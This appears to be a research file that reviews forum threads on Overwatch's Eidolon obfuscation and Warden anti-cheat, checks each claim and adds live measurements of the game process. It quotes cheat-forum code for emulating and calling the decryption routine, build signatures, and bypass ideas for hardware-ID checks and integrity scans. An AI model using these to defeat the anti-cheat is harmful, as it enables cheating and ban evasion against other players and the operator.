1. If module code lived in `Overwatch.exe` as ordinary `.text`, it would be as static and
   as inspectable as any other shipped binary. Blizzard ships the exe's `.text` to millions
   of machines. Shipping the anti-cheat's own scanning routines there would be self-defeating.
2. "Warden modules can be updated while the game is running" (post #18) is only compatible
   with the module bytes arriving *after* launch â€” from the server, or from an encrypted
   container decrypted on demand.
3. Therefore a dispatcher must exist somewhere (the OP's VEH handler and TLS callbacks are
   not disputed â€” nobody produced a counter-offset), but the *module payloads* need not be
   in the image.

`betsit` is listed as **"Location: Blizzard HQ"** â€” if genuine, they have direct knowledge
and their architectural claim outranks the OP's. `[UNV]` â€” unverifiable and equally
applicable to a knowledgeable third party.

## B4. Fabrication allegation `[UNV]`

`arnab18`'s post #38 asserts the OP was Claude-generated. Counter-evidence in the thread:
the OP contains a **section numbering error pattern and spelling consistent with a human
drafting fast** (`diffrent`, `MemoryTasHasFailed`, `VerSetConditionMask`, dup `3-`, skipped
11.1/11.2/9.3, `.ei\`` typo) â€” an LLM would rarely produce those; and the author's insistence
on live verification with an independently written C++ tool (#7) is a claim that is either
true or a much more elaborate fabrication than a generative model would produce. **Verdict:
unresolvable without reproducing the measurements. Do not cite either side.**

---

# PART C â€” Three additional threads (previously uncovered)

## C1. Thread 734223 â€” `[Tutorial] Emulate Eidolon` (catalpaaaa, 2026-01-17)

**This is the most actionable technical content in the entire corpus, and the previous
revision of this file missed it.** It supersedes the OP's RVA `0xEEA40` as a lead, because it
gives **signatures** instead of addresses.

```
To emulate Eidolon, you need:
1) Your favourite emulator (Unicorn in this case).
2) Memory read.
3) The TEB base address.
4) A known instance where Eidolon is being called/used.

Start by setting up a standard Unicorn engine with no special configuration. Add a
UC_HOOK_MEM_UNMAPPED hook; inside that hook, use your favourite memory read to fetch bytes
from the game at the faulting address and map some amount of data at that location. This hook
removes the need to manually locate the memory region where the current Eidolon code resides.
```

```c
uc_open(UC_ARCH_X86, UC_MODE_64, &uc);
uc_hook_add(uc, &memory_unmapped_hook_ptr, UC_HOOK_MEM_UNMAPPED,
            (void *)memory_unmapped_hook, nullptr, 1, 0);
uc_mem_map(uc, stack_base, stack_size, UC_PROT_ALL);
```

**Eidolon reads PEB fields as part of its computation** `[SRC]`, live trace:
```
Overwatch_loader.dll+26520A - mov rcx, gs:[00000060]
  RAX=0000000000000002  RBX=00000000A6082B23  RCX=0000000000000000
  RDX=00007FF87DE7520A  RSI=0000000001280420  RDI=0000000010008128
  RBP=00000000BDADF318  RSP=00000008814FEFC0  R8=00007FF87E197168
  R9=0000000000000000  R10=0000000000000006  R11=00000000FFFFFFF4
  R12=3333333333333333  R13=37DC8C2DCCE148A1  R14=00000000C84A419C
  R15=651B8DF5C8A1B854  RIP=00007FF87DE7520A
-
Overwatch_loader.dll+265213 - mov rcx,[rcx+38]
  RCX=000000088133E000  (same register set otherwise)
```
> *"In addition to hard-coded constants, Eidolon also uses values from the TEB as variables
> during its encryption."* â€” set `UC_X86_REG_GS_BASE` to the TEB base.

**Call-site signatures (build-stable â€” use these, not the OP's RVAs):**
```
40 53 57 48 83 EC ? 48 8D 15
48 89 5C 24 ? 57 48 81 EC ? ? ? ? 48 8B 05 ? ? ? ? 48 33 C4 48 89 84 24 ? ? ? ? 48 8B CA
```

**Calling convention + the CFF problem:**
> *"Because of control-flow flattening, it's difficult to locate Eidolon's return block.
> Therefore, end emulation at the instruction immediately after Eidolon returns, the returned
> address will still be unchanged. Eidolon follows the standard calling convention: RCX is
> the input, and RAX is the output. The TEB is the annoying thing that got me."*

```c
inline bool memory_unmapped_hook(uc_engine *uc, uc_mem_type type, uint64_t address,
                                 int size, int64_t value, void *user_data)
{
    uint64_t address_page_aligned = address & ~0xFFFuLL;
    ReadBuffer read_buffer = Read<ReadBuffer>(address_page_aligned);
    uc_mem_map(uc, address_page_aligned, sizeof(read_buffer.data), UC_PROT_ALL);
    uc_mem_write(uc, address_page_aligned, read_buffer.data, sizeof(read_buffer.data));
    return true;
}

inline uint64_t eidolon(uint64_t val)
{
    uint64_t eidolon_caller = module_base + Offsets::eidolon_caller;
    uint64_t eidolon_return = module_base + Offsets::eidolon_return;
    uint64_t result = 0;
    uc_reg_write(uc, UC_X86_REG_RSP, &stack_start);
    uc_reg_write(uc, UC_X86_REG_RCX, &val);
    uc_emu_start(uc, eidolon_caller, eidolon_return, 0, 0);
    uc_reg_read(uc, UC_X86_REG_RAX, &result);
    return result;
}
```
`Octavian233` (rep-power 170) replies *"I think you missed something important"* and adds a
`teb+0x30` case (TEBâ†’PEB pointer) the first code does not cover.

## C2. Thread 712669 â€” `[Source] easily call eidolon::Xor for internal` (2025-08-08)

**This is the single strongest piece of evidence in the corpus that Eidolon's constants
rotate between builds** â€” the thing the OP asserted and never proved.

`completelyWrong`, 2025-08-08:
```c
uint64_t ImageBase = *(uint64_t*)(__readgsqword(0x60) + 0x10);
extern "C" uint64_t _call_address = ImageBase + 0x612C11;
```
```asm
_eidolon_xor PROC
    push rbx
    lea  rax, [fixstack]
    push rax
    push rbp / rsi / rdi / r12 / r13 / r14 / r15
    sub  rsp, 80h
    xor  r14, r14                ; for jump condition
    jmp  _call_address
fixstack:
    mov  rbx, 9200B34D13951004h
    xor  rax, rbx
    pop  rbx
    ret
```
Earlier revision of the same idea (`_eidolon_caller(value, void* buffer)` at
`ImageBase + 0x1A3A83C`), post-call fixup:
```cpp
arg.result  = std::rotl(arg.result, 0xD);
arg.result ^= 0x73;
arg.result -= 0x5CE8C80823ED9F9;
arg.result ^= 0x9DB60EE26BE000C7;
arg.result  = std::rotr(arg.result, 0x1B);
```

**2025-08-27, `LegendxQueen` reports the constants moved:**
> *"i was using your _eidolon_xor code using 0x612C11 â€” i updated the offset to be 0x621BE7
> and i changed `mov rbx, 9200B34D13951004h` to be `mov rbx, 0A16C77B518ED79F9h` but im
> crashing"*

`completelyWrong` replies: *"1. do not xor 0A16C77B518ED79F9h, just set rsi, r12 to 0 b4
call, and rotate rax left after call. 2. reserve enough stack and set stack ptr. 3. use ur
brain"*

**Confirmed facts from this thread:**
- The XOR primitive exists, is callable, and is **`RCX` in â†’ `RAX` out** (matches C1).
- Its entry RVA moved `0x612C11 â†’ 0x621BE7` in **19 days** (Aug 8 â†’ Aug 27, 2025).
- The per-build fix-up constant moved `0x9200B34D13951004h â†’ 0x0A16C77B518ED79F9h`.
- Output post-processing is **rotate-based**, not a plain XOR â€” consistent with the OP's
  `std::rotl(...,0xD)` / `std::rotr(...,0x1B)` chain.
- CFF means several callee-saved registers must be **zeroed** before entry (`rsi`, `r12`,
  `r14`, `rbp`, `rbx`) â€” they are branch-condition state, not garbage.
- `Octavian233` notes the trivial alternative he uses instead: patch the function to
  `48 89 C8 C3` (`mov rax, rcx; ret`) â€” *"inject as long as the game starts, patch the crc
  checks, and, just patch the function to return."* (We do not do this â€” Â§F.)

> **`[UNV]` PEB offset conflict.** This thread reads the image base at `PEB+0x10`; C1's live
> trace reads `PEB+0x38`. The standard x64 PEB puts `ImageBaseAddress` at **PEB+0xC8** and
> `NtGlobalFlag` at **PEB+0xD0**. Three different values across three artifacts. Dump your
> own PEB before trusting any of them â€” including the OP's `NtGlobalFlag @ PEB+0xBC`.

## C3. Thread 756071 â€” `Overwatch_Loader.dll Warden Module Analysis` (OP, 2026-06-05)

Full body retrieved. This is the same author as 761091, one month earlier, and **its
architecture claims are the ones `betsit` attacks in post #10** (*"you're the person who
claimed warden is in overwatch_loader.dll"*). The author retracted it in 761091 #11
(*"the other post was before i knew better"*). Preserved here because its **loader-side
mechanism** detail is the most concrete in the whole corpus.

**Dynamic API resolution â€” a custom import-descriptor table parsed at boot:**
```
the dll does not import any sensitive APIs statically, instead it stores ALL API Names
Encrypted in eid section

Structure found at runtime
  .eid:... -> "HID.DLL"
  .eid:... -> "HidD_GetProductString"
  .eid:... -> off_926702 -> __IMPORT_DESCRIPTOR_HID

For each entry in .eid:
  dll_name = decrypt(.eid_entry.dll_name)
  api_name = decrypt(.eid_entry.api_name)
  lib      = LoadLibraryA(dll_name)
  func     = GetProcAddress(lib, api_name)
  qword_4ACxxx[slot] = func      // stored in global pointer table
```
> **`qword_4ACxxx` matches the OP's `0x4AC878` trampoline RVA.** Two independent posts, one
> month apart, land in the same `0x4ACxxx` region. This is the best-corroborated address in
> the file â€” and it still must be re-found per build.

**APIs named as live entries in `.eid`** (beyond the OP's 13-row decoy table):
| API | DLL | Stated role |
|-----|-----|-------------|
| `HidD_GetProductString` | hid.dll | USB Device Serial (HWID) |
| `HidD_GetSerialNumberString` | hid.dll | USB serial number (HWID) |
| `HidD_GetManufacturerString` | hid.dll | USB manufacturer (HWID) |
| `GetAdaptersInfo` | IPHLPAPI.dll | MAC Address (HWID) |
| `RegOpenKeyExW` | ADVAPI32.dll | Registry HWID (install ID, volume serial) |
| `WTHelperGetProvSignerFromChain` | WINTRUST.dll | integrity verification |
| `DwmGetCompositionTimingInfo` | DWMAPI.dll | Overlay Detection |
| `EnumWindows` | USER32.dll | window detection (cheat overlays) |
| `GetAsyncKeyState` | USER32.dll | input-monitoring detection |
| `sfc.dll` | sfc.dll | anti-tamper integrity |

**Central HWID collector `[UNV â€” author says "from my reversing probably"]`:**
```
sub_2C1360:  GetAdaptersInfo             -> reads MAC address
              HidD_GetProductString      -> reads USB device product strings
              HidD_GetSerialNumberString -> reads USB serials
              RegOpenKeyExW              -> reads Windows install ID
              // Result hashed and stored
```
*"the function uses cff ( control flow flatting ), it has API Monitor also"*

**Additional detection signals `[SRC]`:**
- `SOFTWARE\Blizzard Entertainment\Battle.net\Identity\Identity` â€” *"just 56 Bytes, 8 bytes
  every line ... game checks it for HWID Bans"*
- Kernel driver detection: DeviceIoControl-based IOCTL probing.
- Shared memory: `NtOpenDirectoryObject` / `NtQueryDirectoryObject` scan of `\BaseNamedObjects`;
  *"MDL Shared Memory not Detected"*
- `GetComputerNameW`, `GetUserNameW`.
- `GlobalMemoryStatusEx.ullTotalPageFile >> 20` â€” total page file in MB.
- `GetNativeSystemInfo` â†’ `wProcessorLevel`; `GetAdaptersInfo` â†’ `AdapterName`,
  `AdapterDescription`.
- CPUID: comment claims `cpuid(1).ECX`/`.EDX` + `__cpuid(0)` vendor need spoofing, hedged
  (*"anyway, idk but maybe ow2 patch these or change loc/apis"*).
- kdmapper: *"for kernel driver loading probably kdmapper still ud"* â€” single comment, as of
  June 2026.
- Anti-debug: *"warden hooks nt api funcs via GetProcAddress Res, at startup"* with
  `NtOpenProcess`, `NtReadVirtualMemory`, `NtQuerySystemInformation`, `NtCreateThreadEx`,
  `NtProtectVirtualMemory` â€” but the author immediately adds *"those are examples ... he use
  GetProcAddress but probably not uses these apis like ntopenproc, ntreadvm, writevm, etc
  they are examples i put them."* **Do not treat that list as findings.**

**Suggested bypasses from 756071** (recorded for completeness; we adopt none):
usermode hook `RegOpenKeyExW` / `GetAdaptersInfo` / `GetUserNameW`; kernel
`CmRegisterCallback`; hook `NtDeviceIoControlFile` for NDIS; *"bypass memory integrity scan
by patch resolved func table in the warden dll (`qword_4ACxxx`) not the dll"*.

## C4. Thread 639855 â€” `[Information] Overwatch2 New Obfuscator Eidolon` (2024-05-31)

First public sighting of `Overwatch_loader.dll`. PDB path
`/opt/eidolon/__build/windows_gmake/bin/x64/Release/eidolon_loader.pdb` â€” confirms it is a
Blizzard-built shared obfuscation library, not OW-specific. Game calls the ordinal-1 export
via an internal `Overwatch_loader_1()` wrapper inside `sub_66A880`, then checks
`RtlGetVersion` / `WineGetVersion` and build numbers. The thread reports Blizzard
**temporarily reverted** to prior encryption shortly after. `[SRC]`

## C5. Independent tooling â€” AutoDump / WoWAutoDump (fetched 2026-10-15)

`deepwiki.com/wisetek/AutoDump/4.1-eidolon-anti-tamper-bypass`, repo at commit `fd0e5e2c`,
last indexed 11 June 2026. WoW `Wow_loader.dll`, **not** OW2 â€” technique transfers, addresses
do not.

| Item | Value |
|------|-------|
| `DECRYPT_GADGET_RVA` | `0x1E7040` (hardcoded) |
| Gadget signature | `48 8B 01 C3` = `mov rax,[rcx]; ret` |
| `g_decryptGadget` | `DecryptGadgetFunc` global |
| `DecryptPageWithGadget` | iterates **512Ã—**, passing 8-byte chunks (`UINT64*`) to the gadget |
| `CopyPageAfterTouch` | gadget path, else `memcpy` fallback |
| `PageCopyVEH` | catches `EXCEPTION_ACCESS_VIOLATION`, sets `g_pageCopyFailed=TRUE`, returns `EXCEPTION_CONTINUE_SEARCH`; dump loop skips failed pages |
| Pages guarded as | `PAGE_NOACCESS` â€” "memcpy would trigger immediate access violations" |
| `DumpWowLoader` | *"contains the Eidolon keys and crypto constants"* |

Corroborating from OwnedCore ("Eidolon decrypt p.3"): `.text` is demand-paged; *"running any
Lua function after the game is running will trigger decryption"*; calls go through
**heap-allocated trampoline stubs**, not the PE IAT â€” *"PE imports are fake (3 entries) and
the real calls are scattered across obfuscated call sites that resolve at runtime through
multi-step arithmetic using PEB values."* **The last clause is now confirmed by C1's live
trace (`mov rcx,gs:[60]` / `mov rcx,[rcx+38]`).** Also: *"Eidolon's continuous integrity
checks [hash] the Object Manager and other critical memory segments"*, and the balance
*"Eidolon itself isn't that sophisticated ... if you solve their code obfuscation it can be
largely reversed with static analysis."*

AutoDump README stealth checklist (awareness, not endorsement â€” its own README warns *"dont
run this ... on an account you want to keep"* / *"ultra detected"*): thread-pool execution via
`TrySubmitThreadpoolCallback`; RDTSC random delays 50â€“100ms + `NtDelayExecution` (never
`Sleep`); `StealthZeroMemory`/`SecureZeroBuffer` + barrier; PEB-walk module/IAT rebuild (no
`LoadLibrary`); hidden+system output files; TLS-callback tracking (scan every 10ms for 2 min,
up to 64 callbacks); direct-syscall tables.

## C6. Vendor statement â€” Blizzard D2R forum, 2026-01-22

`us.forums.blizzard.com/en/d2r/t/latest-patch-discussion/170167`, user `BreakYoDaals-1590`,
2:36pm:
> *"So the latest patch was the implementation of their updated anti cheat (obfuscation
> library) measure, named Eidolon. Which was first implemented in Overwatch in June of
> 2024."*

Corroborates C4 exactly (June 2024 first sighting) and frames Eidolon as a **shared library
across titles**, which is why WoW tooling applies.

## C7. Elder sibling â€” WoW Warden Loader module (context only)

`unknowncheats.me/forum/downloads.php?...&id=47576`, 2024-11-15:
> *"This is the initial module warden loads. ... It appears to decrypt certain sections or
> functions as it needs to use them and then re-encrypts them after utilization. This
> includes the future modules it loads."*

**Directly relevant:** Warden modules in the WoW lineage are decrypted-on-use and
**re-encrypted after use** â€” i.e. resident-but-not-resident. This is the same lifecycle
`donttalktome555` describes in 761091 #30 (*"they run for a brief moment and once their task
is done, they r freed"*) and is the most concrete support for the streaming/re-encrypt model.

---

# PART D â€” Verification

Verdict key: **WRONG** (contradicts documented platform behaviour) Â· **UNSUPPORTED**
(speculation presented as fact) Â· **STALE** (build-pinned) Â· **HOLDS** (survives).

## D1. WRONG â€” the runtime "resolved pointer" is not a pointer

> *"the runtime value 0x7055F4364AF3E95C (reversed for big-endian) is: 1- A valid usermode
> address (in the 0x7FFE... range after ASLR adjustment)"*

Three separate errors:
1. **Not canonical.** x86-64 requires bits 63:48 to be the sign-extension of bit 47.
   `0x7055F4364AF3E95C` has bits 63:48 = `0x7055` while bit 47 = 0 â€” non-canonical under
   both 4-level and 5-level paging. It cannot be dereferenced as a function pointer.
2. **Not in `0x7FFE...`.** `0x7FFE...` is the shared-user-data range, not an image or code
   range. The claim is incoherent regardless of the non-canonical problem.
3. **Wrong endianness reasoning.** Windows x64 is little-endian; "reversed for big-endian"
   is meaningless here. The bytes read as `0x7055F4364AF3E95C` in LE already.

Consistent with `0x7055F4364AF3E95C` being **encrypted data**, not a pointer â€” which is what
756071's model predicts (`.eid` entries decrypted into a pointer table).
**Verdict: WRONG. The trampoline argument in Â§4.5/Â§5 rests on this.**

Also unresolved: static dump is quoted as **10 bytes** `00 00 00 63 B9 68 02 00 00 00`
but runtime as **8 bytes**. An IAT slot is 8 bytes. The extra 2 bytes indicate the OP read
across a slot boundary or mislabelled the offset.

## D2. WRONG â€” VEH "first chance" vs debugger ordering

> *"The Handler is Registred as a First Chance VEH, not last chance VCH. first chance means
> Warden Get every exception before any Debugger"*

`RtlAddVectoredExceptionHandler(1, h)` â€” argument 1 controls **position within the VEH
list** (1 = add at the front, so it runs before other VEH handlers). It says nothing about
debuggers.

"First chance" is the *stage* of exception dispatch, not an ordering claim. In
`KiUserExceptionDispatcher`, a debugged process receives the `DBG_EXCEPTION_FIRST_CHANCE`
notification **before** the VEH chain is invoked. A VEH handler therefore runs **after** the
debugger has already seen the exception. Two unrelated uses of one phrase.

The OP's downstream conclusion â€” *"even attaching a debugger before the entrypoint will be
caught"* â€” is **not** established by this mechanism, though it may still be true via TLS
callback ordering (see D4).
**Verdict: WRONG.**

## D3. WRONG â€” `SEHandlerCount == 0` â‡’ VEH-only

> *"SE Handler Count: 0, no SEH Handlers, warden uses VEH exclusively ... this is unusual"*

SafeSEH is an **x86** mechanism. On x64 there is no SafeSEH table â€” structured exception
handling is driven by the unwind metadata in `.pdata` / `.xdata`. `SEHandlerCount = 0` in
the load config is the **expected value for any normal x64 image** and carries no
information about whether the image uses SEH.

**Verdict: WRONG.** The "unusual" claim is an artefact of reading an x86 field on an x64
binary. (A prior community reviewer made exactly this point; the OP never addressed it.)

## D4. UNSUPPORTED â€” the `.pdata` count would have settled it

The OP read `Load Config`, `Guard CF Check Func Pointer`, `Guard CF Dispatch Func Ptr` and
`Guard Flags: 0x100` out of the load config but stopped before the exception-directory
counts. `IMAGE_LOAD_CONFIG_DIRECTORY64` also carries `SEHandlerTable`/`SEHandlerCount`
(x86 only) â€” and the *real* signal on x64 is `IMAGE_DIRECTORY_ENTRY_EXCEPTION` pointing at
the `.pdata` runtime-function table.

Walking `.pdata` would immediately show whether `Overwatch.exe` has unwind handlers, how
many, and â€” via `UNW_FLAG_EHANDLER` / `UNW_FLAG_UHANDLER` â€” which functions install
`__except_handler3`/4. That is the test that makes the VEH claim either strong or moot.
**Not done by the OP. Do it.**

## D5. UNSUPPORTED â€” the single import â‡’ "nothing to hook"

> *"Hooking Overwatch.exe IAT is impossible ( there nothing to hook ). All Standard API
> monitors ( API Monitor, process monitor, in API Mode ) see nothing"*

The import directory describes **statically declared** imports only. It says nothing about
runtime API resolution. And:
- **ProcMon does not use the target's IAT.** It is a kernel-mode driver + usermode logger
  using `PsSetCreateProcessNotifyRoutine` / `PsSetLoadImageNotifyRoutine` and
  `ObRegisterCallbacks`. It sees `LoadLibrary`/`GetProcAddress` regardless of the target's
  import table. The claim that ProcMon "sees nothing" is straightforwardly false.
- **API Monitor** hooks the target's IAT â€” so for a genuinely single-import exe, that half
  is fair, but only for statically-declared calls.
- Nothing prevents hooking the **ntdll export table** (inline-detoured `LdrLoadDll`,
  `LdrGetProcedureAddress`), which is exactly what Eidolon's own resolver must call.

**Verdict: UNSUPPORTED â€” half true and importantly misattributed.** "Only one import" is a
live, checkable observation (Â§F re-verify list). "Therefore nothing is hookable" does not
follow.

## D6. UNSUPPORTED â€” 1.2M `0xCC` is CFG

> *"the 1.2M INT3 in static dump is CFG ( control flow guard ) not warden patches"*

CFG does not emit `0xCC`. CFG metadata lives in `.gfids` / `.giats` (and `.gxfg` for the
XFG bitmap); its *check* is a `__guard_check_icall` call, not padding. Large `0xCC` runs in
`.text` come from MSVC inter-function padding, `/hotpatch`-style alignment, or regions whose
contents were replaced. The OP never inspected the bytes or disassembly around those 1.2M
bytes, so no attribution is supportable.

**Two further problems, both now measured (2026-10-15, live `Overwatch.exe`):**

1. **Our census measured 1,199,181 `0xCC` bytes at runtime** (3% of 31,457,280 sampled bytes
   across 905 of 905 executable regions) â€” the same order as the OP's *static* figure. So the
   OP's "runtime 0" line does not hold, and the staticâ†’runtime contrast he implied was never
   real. **The most likely explanation for the whole 1.2M is ordinary MSVC padding.** Note the
   scope mismatch: our census is process-wide, the OP's was one module.
2. **CFG is not enabled on this build.** Our read-back of the target's CFG policy is
   `enable 0 strict 0`. A CFG-instrumented image with CFG enforcement disabled at process
   level is consistent â€” but it means CFG cannot be doing meaningful work here either, and
   the OP's `Guard Flags: 0x100` reading is CONFIRMED by the target's own load config (see D6a).

**Verdict: WRONG attribution, and no alternative attribution is supported either.** Most
likely benign padding. This file previously advanced a demand-paging theory here; that
theory is **retracted** in Part E on the strength of measurement (1).

## D6a. **RESOLVED â€” the OP was right, and this file was wrong**

> OP Â§3.1: *"Guard Flags: 0x100 ( CFG Instrumented )"* and *"Load Config Size: 320 Bytes"*
> â†’ **our read-back of the target's own load configuration: `GuardFlags = 0x00000100`,
> load config size 320.**

Both of the OP's load-config claims are now reproduced **exactly, bit for bit**, on the
real target. `0x00000100` is `IMAGE_GUARD_CF_INSTRUMENTED` and nothing else â€” the OP's
`0x100` is not an approximation, it is the value.

**This overturns a verdict this file had carried since the first read-back.** The earlier
conclusion was "the OP's `GuardFlags: 0x100` is **CONTRADICTED**". That was wrong, and it
was wrong in the way this file keeps getting things wrong: it compared the OP's **load
config declaration** against the **process CFG policy** and treated a difference between two
different fields as a refutation. The OP read the load config correctly all along. The
policy being off at runtime is a separate fact about enforcement, not a disagreement about
the image.

**What survives of the original worry:** CFG still contributes no *enforcement* on this
build, so the "CFG fastfail" idea behind Â§6.4/Â§7 does not hold. That is a statement about
what the mechanism does, not about whether the OP read the field correctly.

**The method note is the part worth keeping.** This is the third time in this file that a
verdict was reached by comparing a measurement against a claim that was about something
else. The discipline that catches it is the same one: **read the field the claim is about,
from the place the claim says it comes from.**

Either way, **"the 1.2M `0xCC` is CFG" is dead**: CFG is off, and CFG never emitted `0xCC`.

## D7. WRONG â€” `CheckRemoteDebuggerPresent` "queries csrss.exe"

> *"CheckRemoteDebuggerPresent() queries csrss.exe"*

`CheckRemoteDebuggerPresent` calls `NtQueryInformationProcess(ProcessDebugPort)` on the
**current process handle**. No csrss.exe involvement. (This was also the earliest, and one
of the few, points a community reviewer made that the OP answered on the merits.)
**Verdict: WRONG.**

## D8. WRONG â€” `CryptStringToBinaryW` as an encoder

> *"8- Base64 Encoding, CryptStringToBinaryW -> final payload"*

`CryptStringToBinaryW` is a **decoder** (text â†’ binary). The encoder is
`CryptBinaryToStringW`. The direction is backwards in the stated chain.
**Verdict: WRONG.**

## D9. UNSUPPORTED â€” the VEH chain walk

> *"VEH 1: Handler=ntdll!RtlpExceptionHandler (default ntdll handler)"*

ntdll does **not** register a default entry in `RtlpVectoredHandlerList`; the list contains
only what usermode registered via `Add/RtlAddVectoredExceptionHandler`. Also:

- `_VECTORED_HANDLER_ENTRY` is not a stable public struct. Observed x64 layouts differ
  across builds â€” commonly `LIST_ENTRY` (+0x00), then the handler pointer and `RefCount` in
  either order. The OP's `RefCount` at +0x10 / `Handler` at +0x18 / `Pad` at +0x20 layout is
  one plausible variant, not a fact. **Do not hardcode it.**
- `RtlpVectoredHandlerList` is **not exported**. Locating it requires symbol lookup
  (`.sym`/`PDB` on a matching ntdll build, or pattern scan) and then a **lock-protected**
  walk; the OP's own note concedes this.
- With `AddVectoredExceptionHandler(1, ...)`, Warden's handler would be at the **head** of
  the list â€” the inverse of the order shown.

**Verdict: UNSUPPORTED as presented.**

## D10. UNSUPPORTED â€” hash-table dispatch, from zero evidence

> *"Warden uses a runtime hash table: Hash = CRC32 Variant or custom rolling ... if collision
> linear probing ... that explains why IDA Shows 0 xrefs"*

Nothing is demonstrated: no hash function located, no polynomial, no table base, no compare
site, no entry layout, no traced lookup. The explanatory chain is circular â€” *"IDA shows no
xrefs, therefore a hash table"* â€” when the equally available explanations are (a) string
decryption at the point of use (which this very thread documents elsewhere), (b) the strings
are not Warden module names at all (see D11), or (c) the strings sit in pages that are not
plaintext until executed (Part E).

Absence of a static xref is **not** evidence of a hash table. It is evidence of nothing in
particular.
**Verdict: UNSUPPORTED.**

## D11. UNSUPPORTED â€” "FkCheck / VCheck / IntegrityCk" as Warden modules

This is the weakest link in the OP and the one `donttalktome555` attacked from two angles
(#26: *"could you point me to what led you to believe those strings are specifically warden
module names?"*; #24: *"if they were streamed, why would they be stored in the binary?"*).

Problems with the claim as stated:
- **No demonstrated consumer.** Â§7.3 concedes exactly one LEA xref exists
  (`MemoryTestHasFailed` @ `0x4F2A02`). The other four have **zero** demonstrated
  references of any kind â€” which is what Â§7.2 then *invents a mechanism to explain away*.
- **The one string that does have an xref is a settings key.** `MemoryTestHasFailed` sits in
  the crash-reporter/`System` settings namespace beside `ForceFMA3` and `WorkerThreadCount`.
  It is read like a configuration flag â€” which is entirely consistent with "integrity failure
  callback" as an OP-assigned *purpose*, not a module identity.
- **Naming convention is not evidence.** `FkCheck`, `VCheck`, `IntegrityCk` are exactly the
  kind of strings a graphics/asset-pipeline or settings codebase emits. Absent a consumer,
  `FkCheck` is as likely "file check" in a content pipeline as "FkCheck" as a Warden module.
- **`Quick_Check` is asserted with `MemoryTestHasFailed` in the same list but the OP never
  locates it in a consistent way**, and a *third* reviewer of this file's earlier draft
  reported `FkCheck` / `VCheck` / `IntegrityCk` resolving as **SQLite opcode-name-table
  entries** (a ~190-entry `tbl[opcode*8]` lookup â€” which would also produce zero `LEA`
  xrefs, for the mundane reason that the table is indexed, not referenced). **[UNV]** â€” worth
  one command to check: search the image for the opcode table and see whether those exact
  strings sit at `tbl + opcode*8` strides.
- The one string with a real xref is the one whose "module" status is weakest.

**Verdict: UNSUPPORTED. Treat all five as unclassified strings pending a demonstrated
consumer.** This does not mean they are not Warden-related â€” it means the OP's evidence
does not show it, and the challengers' streaming model predicts they are *labels* for
streamed payloads rather than modules in the image.

## D12. WRONG â€” "Pre-allocated RWX pool"

> *"No NtAllocateVirtualMemory syscall found in the loaders .text sample ... The most likely
> approach is 3, Warden pre allocates a pool of RWX memory during initialization"*

The reasoning is invalid: absence in a *sample* of `.text` proves nothing, especially in a
CFF-obfuscated image where any given basic block may simply not be resident (Part E). And a
long-lived `PAGE_EXECUTE_READWRITE` allocation contradicts W^X practice that every modern
mitigation assumes.

C7 also describes modules being **re-encrypted after use** â€” a lifecycle that requires no
standing RWX pool at all.
**Verdict: UNSUPPORTED.**

## D13. HOLDS â€” the shapes that survive

### D13a. **Confirmed by our own live read-back** (2026-10-15, `Overwatch.exe` PID 10244)

These are no longer "consistent with" or "confirmed by other threads" â€” they are measured.

| OP claim | Our measurement | Note |
|----------|-----------------|------|
| Â§1 â€” exe has **exactly one** import descriptor | **1 descriptor** | Cheapest, most attackable claim; it holds |
| Â§3.2 â€” exe exports **76** symbols | **94 funcs / 76 names** | Matches to the digit. Strong signal we're reading the same structure |
| Â§1 â€” exe has **3** TLS callbacks | **3 configured**, remote array read | Confirms the survey's out-of-image refusal rule works against a real target |
| Â§6.2 â€” target registers a VEH handler | **`UsingVEH=YES`**, CrossFlags `0x5` | **Existence only.** Says nothing about what it does or about debugger ordering (D2) |
| Â§3.1 - `Guard Flags: 0x100` = CFG instrumented | **`GuardFlags = 0x00000100`**, load config 320 | **CONFIRMED** - the OP was right; D6a |

The first three are the strongest result in this file: an author accused of fabricating a
post (Â§B4) produced three structural claims that a query-only remote survey confirms
independently, one of them matching a decimal count exactly. **That materially weakens the
fabrication allegation for the *structural* half of the OP**, even though the *mechanistic*
half (D1â€“D11) remains riddled with errors. A plausible reading is that the observations are
real and the explanations bolted onto them are not.

### D13b. Confirmed by independent sources

| Claim | Status | Why |
|-------|--------|-----|
| Eidolon = obfuscation/anti-tamper library, shared across Blizzard titles | **HOLDS** | Vendor statement (C6) + PDB path (C4) + cross-title tooling (C5) |
| `.eid` is a custom import-descriptor table parsed at boot | **HOLDS** | Direct runtime structure in C3, independently consistent with the OP's Â§4.5 |
| APIs resolved via `LoadLibraryA`/`GetProcAddress` into a global pointer table | **HOLDS** | C3; matches the AutoDump/WoW heap-trampoline model (C5) |
| XOR primitive with rotate-based output, `RCX`â†’`RAX`, CFF, TEB/PEB-derived state | **HOLDS** | Two independent threads (C1, C2), both with working code |
| **Eidolon magic constants rotate between builds** | **HOLDS â€” now proven** | C2: entry `0x612C11`â†’`0x621BE7` and fixup constant both changed within 19 days |
| TLS callbacks run before the entry point and arm anti-debug | **HOLDS in shape** | Count now confirmed (D13a); mechanism is standard; RVAs stale (D14) |
| Multi-source HWID (registry / MAC / USB / volume / computer / user) | **HOLDS, extended** | C3 adds serial/manufacturer strings, Identity file, pagefile, CPUID, `wProcessorLevel` |

**Note the asymmetry, and it is the main lesson of this file:** the OP's *observations* are
mostly holding up. The OP's *conclusions* mostly are not. Single-import, 76 exports, 3 TLS
callbacks, encrypted `.eid`, runtime-resolved imports â€” these are real and measurable. The
non-canonical pointer, the SEH/VEH inference, the debugger-ordering claim, the CFG
attribution, and the module hash-table are not. **Keep the former, discard the latter, and
never carry a conclusion forward on the strength of a real observation.**

## D14. STALE â€” every build-pinned value

Do not carry these forward without re-deriving them:

| Value | Meaning | Re-find by |
|-------|---------|-----------|
| `0x02665714 / 0x02665BB0 / 0x026BC5F0` | exe TLS callbacks | walk `.tls` â†’ callback array |
| `0x39F790` | loader TLS callback array | same |
| `0x4AC878` / `0x5CC878` / `0x007BC878` | IAT trampoline | the `0x4ACxxx` global pointer table (C3) |
| `0x02E5C548 / 58` | Guard CF check/dispatch | parse `IMAGE_LOAD_CONFIG_DIRECTORY64` |
| `0x34645E8 / 0x3464A54 / 0x3464960 / 0x3459480 / 0x395E8A4` | the five unclassified strings | see D11 |
| `0x4F2A02` | the one LEA xref | scan for the string, then for refs |
| `0xEEA40` | string decrypt | **superseded by the C1 signatures** |
| `0x1BD7F1A` / `0x2599931` | SHA-1 K[] / RC4 KSA | SHA-1 K[] are universal constants â€” finding them proves nothing |
| `ntdll!0x0009DE30` | `RtlAddVectoredExceptionHandler` | per-build ntdll |
| `0x4DAD38` | crash-callback export | parse the loader export directory |
